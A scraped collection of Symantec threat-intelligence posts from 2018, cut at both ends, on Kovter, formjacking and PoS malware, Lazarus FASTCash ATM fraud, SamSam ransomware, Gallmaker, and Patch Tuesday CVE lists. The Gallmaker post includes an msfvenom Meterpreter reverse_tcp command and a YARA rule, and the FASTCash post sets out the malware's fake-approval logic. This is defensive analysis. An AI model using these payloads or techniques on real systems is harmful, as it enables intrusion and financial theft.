Miuref and Kovter are Trojans spread through malicious email attachments and drive-by downloads from infected websites. Miuref loads several executable files onto infected computers. They may be found in one or more of the following locations: The HKEY_CURRENT_USER “Run” key is set to the path of one of the executables listed above: Kovter infections are located mostly in the registry, but the following files may be found on infected computers: Kovter is known to hide in the registry under: The keys appear like random values and contain scripts. In some cases, a user-agent string can be clearly identified. An additional key containing a link to a Bash script on the hard drive may be placed within the following registry key: Kovter is an evolution ofan older botnet known as Poweliks(Trojan.Poweliks). Like Kovter, Poweliks is a fileless threat that was developed from an earlier file-based variant, known at that time as Wowliks. Like Kovter, Poweliks was mainly deployed as a click-fraud botnet. Infected computers would silently visit web pages in a hidden browser window and display advertisements in that window. Symantec and Norton products protect against these threats as: If you believe you may be infected with Miuref or Kovter and are not a Symantec customer, you can use our free toolNorton Power Eraserto remove it from your system. Customers of the DeepSight IntelligenceManaged Adversary and Threat Intelligence(MATI) service have received reports on uses of the Kovter malware and how adversary groups have utilized this fileless threat in malicious advertising attacks. Symantec's Security Response organization develops and deploys new security content to Symantec customers. Our team of global threat analysts operate 24x7 to track developments on the threat landscape and protect Symantec customers. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/eversion-3ve-arrests-takedown"
  },
  {
    "title": "retail threats formjacking pos",
    "content": "As we enter the busiest shopping period of the year, both offline and online retailers and consumers are facing risks to the security of their payment card data. Formjacking has surged in 2018—with Symantec blocking almost 700,000 formjacking attempts from mid-September to mid-November alone. This surge in formjacking is one of the big stories of 2018—withattackerslike Magecart using supply chain attacks and other tactics to inject malicious scripts into websites to steal payment card information. There have also beenattackson point-of-sale (PoS) systems in bricks-and-mortar stores this year, though none so far that compare to the mega breaches of earlier this decade, which saw tens of millions of credit cards compromised in a single breach. According to recent research from Symantec’s DeepsightManaged Adversary and Threat Intelligence (MATI) team(published in the MATI reportHow Cyber Criminals Monetize Unauthorized PoS System Access And Stolen Card Data- 01 Nov 2018), on dark net marketplaces threat actors are advertising access to PoS systems at prices ranging from $12 for administrative access to one PoS machine, to $60,000 for access to a large corporate network containing thousands of PoS servers and terminals. Meanwhile, depending on its quality, payment card data on the dark web retails for between $1 and $175 per card. The techniques used by PoS scammers remain straightforward and have not evolved greatly in the last number of years, with scammers still using “RAM-scraping” malware to steal payment card details. This RAM-scraping malware works because of how data generally travels around retailers’ systems. Two high-profile actors in the PoS malware space are FIN7 and FIN6. FIN7 is a well-known group that is reported to have stolen more than $1 billion from companies around the world. FIN7 uses sophisticated spear-phishing emails to convince targets to download an attachment that then infects their company network with malware. The malware used by FIN7 is most commonly a tailored version of theCarbanak malware, which has been used in multiple attacks on banks. Companies compromised by FIN7 include well-known brands like Chipotle, Chilli’s, and Arby’s, with the group thought to have compromised thousands of business locations and to have stolen millions of credit card numbers. FIN6 was first spotted in 2016 when it used the Grabnew backdoor and theFrameworkPOSmalware to steal the details of more than 10 million credit cards.The group was also active in 2018, and was seen exploiting living off the land tools such as Windows Management Instrumentation Command (WMIC) and the Metasploit framework to execute PowerShell commands. Both groups are believed to have made many millions of dollars selling the card details they steal on dark web marketplaces—with the Joker’s Stash marketplace appearing to be where most of these transactions take place. However, a few factors have emerged in recent times that may impact the environment around PoS attacks, and the activity of these groups: One new actor we have seen engaged in malicious activity on PoS machines in 2018 is a group we have dubbed Fleahopper. Fleahopper has been active since at least July 2017. It is a financially motivated group that appears to be monetizing its victims by stealing information from infected machines running PoS software. In the latter half of 2018, Fleahopper has been observed using the Necurs botnet to infect victims. It does this in two ways: through Necurs bots and through spam email, likely originating from the Necurs botnet. Symantec has observed Fleahopper delivering malware directly through Necurs bots, where the bots drop malware from Fleahopper onto machines already infected by Necurs. Machines that are not infected with Necurs may still be infected by Fleahopper through spam that comes from the Necurs botnet. Spam emails that deliver malware from Fleahopper have been observed with malicious Microsoft .pub files attached. These .pub files download an installer for the malware used by Fleahopper,Trojan.FlawedAmmyy. The Trojan.FlawedAmmyy RAT is a modified version of the publicly available remote access tool Ammyy Admin (Remacc.Ammyy). Although Trojan.FlawedAmmyy is not believed to be exclusive to Fleahopper, the group has been observed using Trojan.FlawedAmmyy to deliver its tools. Once they've compromised an organization, Fleahopper has been observed dropping a number of files onto machines running POS software. Fleahopper installs a modified legitimate Remote Desktop Protocol (RDP) file onto infected machines running POS software. This gives Fleahopper remote desktop access to the infected machine that is separate from access through malware. Symantec has observed Fleahopper using this access. Symantec has observed Fleahopper activity on machines in grocery stores, furniture stores, restaurants and a store selling men’s clothing. The group’s activity appears to be spread around the globe, with some activity seen targeting businesses based in the U.S. and the U.K. Some of the other PoS malware that has been seen used by various groups in the wild in 2018 includes: RtPOS, Prilex, LusyPOS,LockPOS, GratefulPOS, and FindPOS. There have been several publicly reported attacks on PoS systems in 2018: The compromise of Hudson’s Bay Company’s stores and Chili’s has been linked to FIN7. While these were significant compromises—the details of at least 5 million cards were compromised when the Hudson’s Bay Company stores were targeted—there have been no reports so far of PoS attacks this year affecting tens of millions of consumers. This relative drop in activity in the PoS space compared to previous years could be down to the reasons mentioned above—the increased adoption of chip-and-PIN globally and upset in the FIN7 group. However, it may also indicate that attackers are looking at other ways to make money and get their hands on payment card details—for example, by turning to formjacking. We firstpublished research on formjacking at the end of September 2018, after a spate of high-profile attacks by the Magecart attack group. Among Magecart’s targets were Ticketmaster UK, British Airways, Feedify, and Newegg. One of itsmore recent targetswas British electronics kit retailer Kitronik. Formjacking is a term we use to describe the use of malicious JavaScript code to steal credit card details and other information from payment forms on the checkout web pages of e-commerce sites. It is not a new technique, but in the latter half of 2018, it has garnered a lot of attention due to some large campaigns, many of which have been carried out by Magecart.Recently released research has claimed that Magecart is not just one group—but rather approximately seven groups that are all engaged in similar activity. When a customer of an e-commerce site clicks “submit” or its equivalent after entering their details into a website’s payment form, malicious JavaScript code that has been injected there by the cyber criminals collects all entered information, such as payment card details and the user’s name and address. This information is then sent to the attacker’s servers. Attackers can then use this information to perform payment card fraud or sell these details to other criminals on the dark web. In a two-month period, from mid-September to mid-November, Symantec blocked almost 700,000 formjacking attempts—with a clear upward trend visible as we approach the holiday shopping season. Much as we reported in September, these formjacking attempts target a wide range of e-commerce websites, including a fashion retailer in Southeast Asia, and another in Australia, a U.S. website selling jewelry, and another U.S. store specializing in outdoor gear and equipment. Suppliers of equipment for dentists, and online stores selling gardening equipment, were also among those targeted. These formjacking attempts continue to target a wide range of stores—ranging from small to large retailers in various countries around the world. We detailed in our previous research how, in some cases, Magecart was using supply chain attacks to gain access to its targeted websites and carry out these formjacking attacks. The Magecart attackersinjected malicious JavaScript code into Ticketmaster’s websiteafter they compromised a chatbot from tech firm Inbenta that was used for customer support on Ticketmaster websites, for example. Magecart was then able to alter the JavaScript code on Ticketmaster’s websites to capture payment card data from customers and send it to their servers. Dutch security researcherWillem de Groot has discovered since thenthat Magecart is also exploiting unpatched vulnerabilities in 21 Magento extensions used by online stores to gain access to websites. Magento is an open-source e-commerce platform. Magecart is using a series of URL paths to probe Magento stores in the wild for the vulnerable extensions, and injecting its malicious code into vulnerable websites. As we approach the holiday shopping season, it is likely that we will see a ramping up of activity from actors out to steal consumers’ payment card details—both online and in retail stores worldwide. Victims may not realize they are victims of formjacking as generally their websites continue to operate as normal, and attackers like Magecart are sophisticated and stealthy and take steps to avoid detection. Website owners should be aware of the dangers of software supply chain attacks, as these have been used as the infection vector in some of these formjacking attacks. Software supply chain attacks can be difficult to guard against, but there are some steps that website owners can take: Producers of software packages should ensure that they are able to detect unwanted changes in the software update process and on their website. Website owners can also use content security policieswith Subresource Integrity tags (SRI)to lock down any integrated third-party script. Customers of the DeepsightManaged Adversary and Threat Intelligenceroutinely get intelligence about threats posed by cyber criminals, including details of PoS threats. These intelligence reports provide IOCs and detail adversary TTPs so that customers can better defend their environment from emerging threats. Symantec's Security Response organization develops and deploys new security content to Symantec customers. Our team of global threat analysts operate 24x7 to track developments on the threat landscape and protect Symantec customers. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/retail-threats-formjacking-pos"
  },
  {
    "title": "microsoft patch tuesday november 2018",
    "content": "As always, customers are advised to follow these security best practices: Microsoft's summary of the November 2018 releases can be found here:https://portal.msrc.microsoft.com/en-us/security-guidance This month's update covers vulnerabilities in: The following is a breakdown of the issues being addressed this month: Cumulative Security Update for Microsoft Browsers Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-8541)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-8542)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-8543)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-8551)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-8555)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-8556)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-8557)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-8588)MS Rating: Critical Internet Explorer Memory Corruption Vulnerability(CVE-2018-8570)MS Rating: Important Microsoft Edge Privilege Escalation Vulnerability(CVE-2018-8567)MS Rating: Important Microsoft Edge Spoofing Vulnerability(CVE-2018-8564)MS Rating: Important Microsoft Edge Information Disclosure Vulnerability(CVE-2018-8545)MS Rating: Important Windows Scripting Engine Memory Corruption Vulnerability(CVE-2018-8552)MS Rating: Important Windows VBScript Engine Remote Code Execution Vulnerability(CVE-2018-8544)MS Rating: Critical Cumulative Security Update for Microsoft Office Microsoft Outlook Remote Code Execution Vulnerability(CVE-2018-8522)MS Rating: Important Microsoft Outlook Remote Code Execution Vulnerability(CVE-2018-8576)MS Rating: Important Microsoft Outlook Remote Code Execution Vulnerability(CVE-2018-8524)MS Rating: Important Microsoft Outlook Remote Code Execution Vulnerability(CVE-2018-8582)MS Rating: Important Microsoft Outlook Information Disclosure Vulnerability(CVE-2018-8558)MS Rating: Important Microsoft Outlook Information Disclosure Vulnerability(CVE-2018-8579)MS Rating: Important Microsoft Exchange Server Privilege Escalation Vulnerability(CVE-2018-8581)MS Rating: Important Microsoft SharePoint Privilege Escalation Vulnerability(CVE-2018-8568)MS Rating: Important Microsoft SharePoint Privilege Escalation Vulnerability(CVE-2018-8572)MS Rating: Important Microsoft SharePoint Information Disclosure Vulnerability(CVE-2018-8578)MS Rating: Important Microsoft Excel Remote Code Execution Vulnerability(CVE-2018-8574)MS Rating: Important Microsoft Excel Remote Code Execution Vulnerability(CVE-2018-8577)MS Rating: Important Microsoft Word Remote Code Execution Vulnerability(CVE-2018-8539)MS Rating: Important Microsoft Word Remote Code Execution Vulnerability(CVE-2018-8573)MS Rating: Important Cumulative Security Update for Microsoft Windows Kernel Windows Kernel Information Disclosure Vulnerability(CVE-2018-8408)MS Rating: Important Win32k Privilege Escalation Vulnerability(CVE-2018-8562)MS Rating: Important Win32k Information Disclosure Vulnerability(CVE-2018-8565)MS Rating: Important Windows Win32k Privilege Escalation Vulnerability(CVE-2018-8589)MS Rating: Important Windows Deployment Services TFTP Server Remote Code Execution Vulnerability(CVE-2018-8476)MS Rating: Critical Cumulative Security Update for Microsoft Windows Microsoft Graphics Components Remote Code Execution Vulnerability(CVE-2018-8553)MS Rating: Critical DirectX Information Disclosure Vulnerability(CVE-2018-8563)MS Rating: Critical DirectX Privilege Escalation Vulnerability(CVE-2018-8485)MS Rating: Important DirectX Privilege Escalation Vulnerability(CVE-2018-8554)MS Rating: Important DirectX Privilege Escalation Vulnerability(CVE-2018-8561)MS Rating: Important PowerShell Remote Code Execution Vulnerability(CVE-2018-8256)MS Rating: Important Microsoft Powershell Tampering Vulnerability(CVE-2018-8415)MS Rating: Important MSRPC Information Disclosure Vulnerability(CVE-2018-8407)MS Rating: Important Microsoft JScript Security Feature Bypass Vulnerability(CVE-2018-8417)MS Rating: Important Windows Search Remote Code Execution Vulnerability(CVE-2018-8450)MS Rating: Important Windows Audio Service Information Disclosure Vulnerability(CVE-2018-8454)MS Rating: Important Microsoft RemoteFX Virtual GPU miniport driver Privilege Escalation Vulnerability(CVE-2018-8471)MS Rating: Important Active Directory Federation Services XSS Vulnerability(CVE-2018-8547)MS Rating: Important Windows Security Feature Bypass Vulnerability(CVE-2018-8549)MS Rating: Important Windows COM Privilege Escalation Vulnerability(CVE-2018-8550)MS Rating: Important BitLocker Security Feature Bypass Vulnerability(CVE-2018-8566)MS Rating: Important Microsoft Project Remote Code Execution Vulnerability(CVE-2018-8575)MS Rating: Important Windows ALPC Privilege Escalation Vulnerability(CVE-2018-8584)MS Rating: Important Windows Privilege Escalation Vulnerability(CVE-2018-8592)MS Rating: Important Cumulative Security Update for Dynamics 365 (on-premises) Microsoft Dynamics 365 (on-premises) version 8 Remote Code Execution Vulnerability(CVE-2018-8609)MS Rating: Critical Microsoft Dynamics 365 (on-premises) version 8 Cross Site Scripting Vulnerability(CVE-2018-8605)MS Rating: Important Microsoft Dynamics 365 (on-premises) version 8 Cross Site Scripting Vulnerability(CVE-2018-8606)MS Rating: Important Microsoft Dynamics 365 (on-premises) version 8 Cross Site Scripting Vulnerability(CVE-2018-8607)MS Rating: Important Microsoft Dynamics 365 (on-premises) version 8 Cross Site Scripting Vulnerability(CVE-2018-8608)MS Rating: Important Security Update for Azure App Service Azure App Service Cross-site Scripting Vulnerability(CVE-2018-8600)MS Rating: Important Security Update for Team Foundation Server Team Foundation Server Cross-site Scripting Vulnerability(CVE-2018-8602)MS Rating: Important Team Foundation Server Remote Code Execution Vulnerability(CVE-2018-8529)MS Rating: Important Security Update for Microsoft .NET Core .NET Core Tampering Vulnerability(CVE-2018-8416)MS Rating: Moderate Security Update for Microsoft Skype for Business Microsoft Skype for Business Denial of Service Vulnerability(CVE-2018-8546)MS Rating: Low More information is available on Symantec's freeSecurity Centerportal and to our customers through the DeepSight Threat Management System. Himanshu is a senior member of Symantec's Cyber Security Services organization. An active contributor to numerous security communities, he frequently provides insight on vulnerabilities and shares his knowledge by writing reports, blogs, and journals. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/microsoft-patch-tuesday-november-2018"
  },
  {
    "title": "fastcash lazarus atm malware",
    "content": "On October 2, 2018,an alert was issued by US-CERT, the Department of Homeland Security, the Department of the Treasury, and the FBI. According to this new alert, Hidden Cobra (the U.S. government’s code name for Lazarus) has been conducting “FASTCash” attacks, stealing money from Automated Teller Machines (ATMs) from banks in Asia and Africa since at least 2016. Lazarus is a very active attack group involved in both cyber crime and espionage. The group was initially known for its espionage operations and a number of high-profile disruptive attacks, including the 2014 attack on Sony Pictures. More recently, Lazarus has also become involved in financially motivated attacks, including anUS$81 million theft from the Bangladesh Central Bankand theWannaCry ransomware. Following US-CERT's report, Symantec’s research uncovered the key component used in the group's recent wave of financial attacks. The operation, known as “FASTCash”, has enabled Lazarus to fraudulently empty ATMs of cash. To make the fraudulent withdrawals, Lazarus first breaches targeted banks’ networks and compromises the switch application servers handling ATM transactions. Once these servers are compromised, previously unknown malware (Trojan.Fastcash) is deployed. This malware in turn intercepts fraudulent Lazarus cash withdrawal requests and sends fake approval responses, allowing the attackers to steal cash from ATMs. According to the U.S. government alert, one incident in 2017 saw cash withdrawn simultaneously from ATMs in over 30 different countries. In another major incident in 2018, cash was taken from ATMs in 23 separate countries. To date, the Lazarus FASTCash operation is estimated to have stolen tens of millions of dollars. In order to permit their fraudulent withdrawals from ATMs, the attackers inject a malicious Advanced Interactive eXecutive (AIX) executable into a running, legitimate process on the switch application server of a financial transaction network, in this case a network handling ATM transactions. The malicious executable contains logic to construct fraudulent ISO 8583 messages. ISO 8583 is the standard for financial transaction messaging. The purpose of this executable has not been previously documented. It was previously believed that the attackers used scripts to manipulate legitimate software on the server into enabling the fraudulent activity. However, analysis by Symantec has found that this executable is in fact malware, which we have namedTrojan.Fastcash. Trojan.Fastcash has two primary functions: Once installed on the server, Trojan.Fastcash will read all incoming network traffic, scanning for incoming ISO 8583 request messages. It will read the Primary Account Number (PAN) on all messages and, if it finds any containing a PAN number used by the attackers, the malware will attempt to modify these messages. How the messages are modified depends on each victim organization. It will then transmit a fake response message approving fraudulent withdrawal requests. The result is that attempts to withdraw money via an ATM by the Lazarus attackers will be approved. Here is one example of the response logic that Trojan.Fastcash uses to generate fake responses. This particular sample has logic to construct one of three fake responses based on the incoming attacker request: For Message Type Indicator == 200 (ATM Transaction) and Point of Service Entry Mode starts with 90 (Magnetic Strip only): If Processing Code starts with 3 (Balance Inquiry): Response Code = 00 (Approved) Otherwise, if the Primary Account Number is Blacklisted by Attackers: Response Code = 55  (Invalid PIN) All other Processing Codes (with non-blacklisted PANs): Response Code = 00 (Approved) In this case, the attackers appear to have built in a capability to selectively deny transactions based on their own blacklist of account numbers. However, the capability was not implemented in this sample, and the check for blacklisting always returns “False”. Symantec has found several different variants of Trojan.Fastcash, each of which uses different response logic. We believe that each variant is tailored for a particular transaction processing network and thus has its own tailored response logic. The PAN numbers used to carry out the FASTCash attacks relate to real accounts. According to the US-CERT report, most accounts used to initiate the transactions had minimal account activity or zero balances. How the attackers gain control of these accounts remains unclear. It is possible the attackers are opening the accounts themselves and making withdrawal requests with cards issued to those accounts. Another possibility is the attackers are using stolen cards to perform the attacks. In all reported FASTCash attacks to date, the attackers have compromised banking application servers running unsupported versions of the AIX operating system, beyond the end of their service pack support dates. Lazarus is a very active group involved in both cyber crime and espionage. Lazarus was initially known for its involvement in espionage operations and a number of high-profile disruptive attacks, includingthe 2014 attack on Sony Picturesthat saw large amounts of information being stolen and computers wiped by malware. In recent years, Lazarus has also become involved in financially motivated attacks. The group waslinked to the $81 million theft from the Bangladesh central bank in 2016, along with a number of other bank heists. Lazarus was alsolinked to the WannaCry ransomware outbreakin May 2017. WannaCry incorporated the leaked “EternalBlue” exploit that used two known vulnerabilities in Windows (CVE-2017-0144andCVE-2017-0145) to turn the ransomware into a worm, capable of spreading itself to any unpatched computers on the victim’s network and also to other vulnerable computers connected to the internet. Within hours of its release, WannaCry had infected hundreds of thousands of computers worldwide. The recent wave of FASTCash attacks demonstrates that financially motivated attacks are not simply a passing interest for the Lazarus group and can now be considered one of its core activities. As with the 2016 series of virtual bank heists, including the Bangladesh Bank heist, FASTCash illustrates that Lazarus possesses an in-depth knowledge of banking systems and transaction processing protocols and has the expertise to leverage that knowledge in order to steal large sums from vulnerable banks. In short, Lazarus continues to pose a serious threat to the financial sector and organizations should take all necessary steps to ensure that their payment systems are fully up to date and secured. Symantec has the following detections in place to protect customers against Lazarus FASTCash attacks: Organizations should ensure that operating systems and all other software are up to date. Software updates will frequently include patches for newly discovered security vulnerabilities that could be exploited by attackers. In all reported FASTCash attacks to date, the attackers have compromised banking application servers running unsupported versions of the AIX operating system, beyond the end of their service pack support dates. D465637518024262C063F4A82D799A4E40FF3381014972F24EA18BC23C3B27EE (Trojan.Fastcash Injector) CA9AB48D293CC84092E8DB8F0CA99CB155B30C61D32A1DA7CD3687DE454FE86C (Trojan.Fastcash DLL) 10AC312C8DD02E417DD24D53C99525C29D74DCBC84730351AD7A4E0A4B1A0EBA (Trojan.Fastcash DLL) 3A5BA44F140821849DE2D82D5A137C3BB5A736130DDDB86B296D94E6B421594C (Trojan.Fastcash DLL) The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/fastcash-lazarus-atm-malware"
  },
  {
    "title": "samsam targeted ransomware attacks",
    "content": "UPDATE: November 29, 2018Two Iranian nationals have beenindicted in the U.S.for their alleged involvement in SamSam attacks. The FBI estimated that the SamSam group had received $6 million in ransom payments to date and caused over $30 million in losses to victims. The group behind the SamSam ransomware (Ransom.SamSam) has continued to mount attacks against entire organizations during 2018, with fresh attacks seen against 67 different targets, mostly located in the U.S. SamSam specializes in targeted ransomware attacks, breaking into networks and encrypting multiple computers across an organization before issuing a high-value ransom demand. The group is believed to be behind the attack on the city of Atlanta in March, which saw numerous municipal computers encrypted. The clean-up costs for the attack areexpected to run to over $10 million. The group was also linked to the attack on the Colorado Department of Transportation, whichresulted in clean-up costs of $1.5 million. During 2018, Symantec has to date found evidence of attacks against 67 different organizations. SamSam targeted organizations in a wide range of sectors, but healthcare was by far the most affected sector, accounting for 24 percent of attacks in 2018. Why healthcare was a particular focus remains unknown. The attackers may believe that healthcare organizations are easier to infect. Or they may believe that these organizations are more likely to pay the ransom. A number of local government organizations in the U.S. were also targeted by the group and at least one of these organizations is involved in administering elections. With the midterm elections in the U.S. taking place on November 6, the focus is naturally on cyber information operations and threats to voting data integrity. However, ransomware campaigns such as SamSam can also be significantly disruptive to government organizations and their operations. The vast majority of SamSam’s targets are located in the U.S. Of the 67 organizations targeted during 2018, 56 were located in the U.S. A small number of attacks were logged in Portugal, France, Australia, Ireland, and Israel. While most ransomware families are spread indiscriminately, usually via spam emails or exploit kits, SamSam is used in a targeted fashion. The SamSam group’s modus operandi is to gain access to an organization’s network, spend time performing reconnaissance by mapping out the network, before encrypting as many computers as possible and presenting the organization with a single ransom demand. The attackers have been known to offer to decrypt all computers for a set ransom and/or offer to decrypt individual machines for a lower fee. In many cases, ransom demands can run to tens of thousands of dollars to decrypt all affected computers in an organization. If successful, these attacks can have a devastating impact on victim organizations, seriously disrupting their operations, destroying business critical information, and leading to massive clean-up costs. The attackers behind SamSam go to great lengths to infect as many computers as possible in a targeted organization. Multiple software tools are used to carry out an attack and, in many cases, the entire process can take days to complete. In order to carry out its attacks, the SamSam group makes extensive use of “living off the land” tactics: the use of operating system features or legitimate network administration tools to compromise victims’ networks. These tactics are frequently used by espionage groups in order to maintain a low profile on the target’s network. By making their activity appear like legitimate processes, they hope to hide in plain sight. For example, in one attack that took place in February 2018, more than 48 hours passed between the first evidence of intrusion and the eventual encryption of hundreds of computers in the targeted organization. The first sign of an intrusion came when the attackers downloaded several hacking tools onto a computer in the targeted organization. Ten minutes later, the attackers began running scripts in order to identify and scan other computers on the organization’s network. They used PsInfo, a Microsoft Sysinternals tool that allows the user to gather information about other computers on the network. This could allow them to identify the software installed on these computers. PsInfo may have been used to identify systems with business-critical files that could be encrypted for ransom. The attackers also used the freely available hacking tool Mimikatz (Hacktool.Mimikatz) against selected computers to steal passwords. After this initial flurry of activity, the attackers returned two days later and, shortly after 5 a.m., loaded the SamSam ransomware onto the initial computer. Interestingly, two different versions of SamSam were loaded. It is likely that two versions were used in order to have an alternative at hand in case one version was detected by security software. An hour later, the attacks began executing SamSam on multiple computers across the organization’s network. This operation was carried out using PsExec, another Microsoft Sysinternals tool, which is used for executing processes on other systems. Five hours later, just under 250 computers on the network had been encrypted. SamSam continues to pose a grave threat to organizations in the U.S. The group is skilled and resourceful, capable of using tactics and tools more commonly seen in espionage attacks. A successful SamSam attack will likely be highly disruptive to any affected organizations. In the worst-case scenario, if no backups are available or if backups are encrypted by SamSam, valuable data could be permanently lost in an attack. Even if an organization does have backups, restoring affected computers and cleaning up the network will cost time and money and may lead to reputational damage. The following protections are in place to protect customers against SamSam attacks: In addition, Symantec’s Targeted Attack Analytics (TAA) is able to identify and flag “living off the land” activity associated with targeted attacks such as SamSam. To find out more about TAA, read our white paperTargeted Attack Analytics: Using Cloud-based Artificial Intelligence for Enterprise-Focused Advanced Threat Protection Backing up important data is one of the key pillars of combating ransomware infections. However, as there have been cases of ransomware encrypting backups, it should not be a replacement for a robust security strategy. Victims need to be aware that paying the ransom does not always work. Attackers may not send a decryption key, could poorly implement the decryption process and damage files, and may deliver a larger ransom demand after receiving the initial payment. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/samsam-targeted-ransomware-attacks"
  },
  {
    "title": "gallmaker attack group",
    "content": "UPDATE October 11, 2018 This blog has been updated with a revised list of IoCs. An earlier list of IOCs attached to this blog was generated through an automated system and, due to the dual-use nature of the tools used by the group, erroneously included some low fidelity IoCs. Symantec researchers have uncovered a previously unknown attack group that is targeting government and military targets, including several overseas embassies of an Eastern European country, and military and defense targets in the Middle East. This group eschews custom malware and uses living off the land (LotL) tactics and publicly available hack tools to carry out activities that bear all the hallmarks of a cyber espionage campaign. The group, which we have given the name Gallmaker, has been operating since at least December 2017, with its most recent activity observed in June 2018. The most interesting aspect of Gallmaker’s approach is that the group doesn’t use malware in its operations.  Rather, the attack activity we observed is carried out exclusively using LotL tactics and publicly available hack tools. The group takes a number of steps to gain access to a victim’s device and then deploys several different attack tools, as follows: Gallmaker is using three primary IP addresses for its C&C infrastructure to communicate with infected devices. There is also evidence that it is deleting some of its tools from victim machines once it is finished, to hide traces of its activity. The DDE protocol can be used for legitimate purposes to send messages between Microsoft applications that share data through shared memory, e.g. to share data between Excel and Word. However, the DDE protocolwas flagged as unsecure last year, when researchers discovered it could be exploited to execute code on victim machines via Excel and Word, without macros being enabled in those applications. Microsoft said at the timethat this capability was a feature and the company did not consider it a vulnerabilitybecause Office always warned users before enabling DDE in documents, as seen in Figure 1. However, after the DDE protocol was subsequently exploited in a number of malware campaigns, Microsoft issued an update to Office in December 2017that disabled DDE by default in Word and Excel. DDE can be enabled manually after this update is applied but only if the registry is altered by an admin account. The Gallmaker victims we have seen did not have this patch installed and therefore were still vulnerable to exploit via the DDE protocol. Gallmaker’s activity appears to be highly targeted, with its victims all related to government, military, or defense sectors. Several targets are embassies of an Eastern European country. The targeted embassies are located in a number of different regions globally, but all have the same home country. The other targets we have seen are a Middle Eastern defense contractor and a military organization. There are no obvious links between the Eastern European and Middle Eastern targets, but it is clear that Gallmaker is specifically targeting the defense, military, and government sectors: its targets appear unlikely to be random or accidental. Gallmaker’s activity has been quite consistent since we started tracking it. The group has carried out attacks most months since December 2017. Its activity subsequently increased in the second quarter of 2018, with a particular spike in April 2018. Gallmaker’s activity points strongly to it being a cyber espionage campaign, likely carried out by a state-sponsored group. Gallmaker may well have continued to avoid detection were it not for Symantec’s Targeted Attack Analytics (TAA) technology. The fact that Gallmaker appears to rely exclusively on LotL tactics and publicly available hack tools makes its activities extremely hard to detect. We havewritten extensively about the increasing use of LotL toolsand publicly available hack tools by cyber criminals. One of the primary reasons for the increased popularity of these kinds of tools is to avoid detection; attackers are hoping to “hide in plain sight”, with their malicious activity hidden in a sea of legitimate processes. Gallmaker may well have continued to avoid detection were it not for Symantec’sTargeted Attack Analytics (TAA)technology. TAA combines the capabilities of Symantec’s world-leading security experts with advanced artificial intelligence and machine learning to provide organizations with their own “virtual analysts”, via our Advanced Threat Protection (ATP) product.  Since its inception, TAA has detected security incidents at thousands of organizations, automating what would have taken many hours of analyst time. In this instance, TAA identified the specific PowerShell commands used by Gallmaker as being suspicious, leading to the discovery of this new campaign.  Without TAA’s advanced AI-based capabilities, Gallmaker’s activities may well have remained undetected. The following protections are in place to protect customers against Gallmaker attacks: Network protection products also detect activity associated with Gallmaker. The following indicators are specific to Gallmaker: Gallmaker also used tools that were available in open source projects. Yara rule and methods shared below were used by Gallmaker but aren't exclusive to the group's activity. Detection of these in one's environment is only indicative of possible unauthorized activity. Each occurrence of triggers must be examined to determine intent. rule Suspicious_docx{meta:copyright = \"Symantec\"family = \"Suspicious DOCX”group = \"Gallmaker\"description = \"Suspicious file that might be Gallmaker” strings:$quote = /<w:fldSimple w:instr=\" QUOTE (( [^\"]+)* [0-9] /$text = \"select \\\"Update field\\\" and click \\\"OK\\\"\" condition:any of them} Use of Rex Powershell -https://github.com/rapid7/rex-powershell Use of obfuscated shellcode executed via PowerShell to download a \"reverse_tcp\" payload from Metasploitonto victim systems. For example, msfvenom -p windows/meterpreter/reverse_tcp -o payload.bin To find out more about TAA, read our whitepaper:Targeted Attack Analytics: Using Cloud-based Artificial Intelligence for Enterprise-Focused Advanced Threat Protection. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/gallmaker-attack-group"
  },
  {
    "title": "microsoft patch tuesday october 2018",
    "content": "As always, customers are advised to follow these security best practices: Microsoft's summary of the October 2018 releases can be found here:https://portal.msrc.microsoft.com/en-us/security-guidance This month's update covers vulnerabilities in: The following is a breakdown of the issues being addressed this month: Cumulative Security Update for Microsoft Browsers Microsoft Edge Memory Corruption Vulnerability(CVE-2018-8473)MS Rating: Critical Internet Explorer Memory Corruption Vulnerability(CVE-2018-8491)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2018-8500)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-8505)MS Rating: Critical Microsoft Edge Memory Corruption Vulnerability(CVE-2018-8509)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-8510)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-8511)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-8513)MS Rating: Critical Internet Explorer Memory Corruption Vulnerability(CVE-2018-8460)MS Rating: Critical Microsoft Edge Security Bypass Vulnerability(CVE-2018-8512)MS Rating: Important Microsoft Edge Security Bypass Vulnerability(CVE-2018-8530)MS Rating: Important Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2018-8503)MS Rating: Low Cumulative Security Update for Microsoft Office Microsoft Exchange Remote Code Execution Vulnerability(CVE-2018-8265)MS Rating: Important Microsoft Exchange Server Privilege Escalation Vulnerability(CVE-2018-8448)MS Rating: Important Microsoft SharePoint Privilee 